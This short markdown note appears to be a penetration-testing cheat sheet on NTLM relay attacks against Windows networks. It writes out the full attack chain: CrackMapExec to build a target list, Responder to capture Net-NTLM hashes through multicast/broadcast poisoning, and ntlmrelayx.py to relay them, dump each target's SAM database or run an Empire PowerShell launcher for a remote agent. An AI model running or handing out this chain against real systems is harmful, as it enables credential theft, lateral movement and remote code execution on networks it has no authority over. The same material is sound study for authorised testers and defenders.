# net-ntlmv2-relay

Since [MS08-068](https://technet.microsoft.com/en-us/library/security/ms08-068.aspx) you cannot relay a Net-NTLM hash back to the same machine you got it from (e.g. the 'reflective' attack) unless you're performing a cross-protocol relay (which is an entirely different topic). However you can still relay the hash to another machine.

```
cme smb <CIDR> --gen-relay-list targets.txt

python Responder.py -I <interface> -r -d -w

ntlmrelayx.py -tf targets.txt

```

By default, [ntlmrelayx.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py) upon a successful relay will dump the SAM database of the target.

execute command

```
ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
```

Let's recap

1. We're using Responder to intercept authentication attempts (Net-NTLM hashes) via Multicast/Broadcast protocols.
2. However, since we turned off Responder's SMB and HTTP servers and have ntlmrelayx.py running, those authentication attempts get automatically passed to ntlmrelayx.py's SMB and HTTP servers
3. ntlmrelayx.py takes over and relays those hashes to our target list. If the relay is successful it will execute our Empire launcher and give us an Empire Agent on the target machine.
